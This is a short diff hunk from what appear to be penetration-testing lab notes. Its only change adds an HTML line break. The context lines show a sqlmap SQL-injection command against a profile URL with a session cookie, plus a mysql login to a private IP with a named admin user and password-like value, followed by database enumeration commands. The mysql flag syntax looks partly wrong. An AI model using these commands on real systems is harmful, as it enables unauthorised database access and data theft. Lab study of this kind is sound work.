@@ -22,7 +22,7 @@ sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jw
 
 
 mysql -U qdpmadmin -h 192.168.1.8 -P passwod 
-
+<br> </br>
 show databases;
 use database_name
 show tables ;
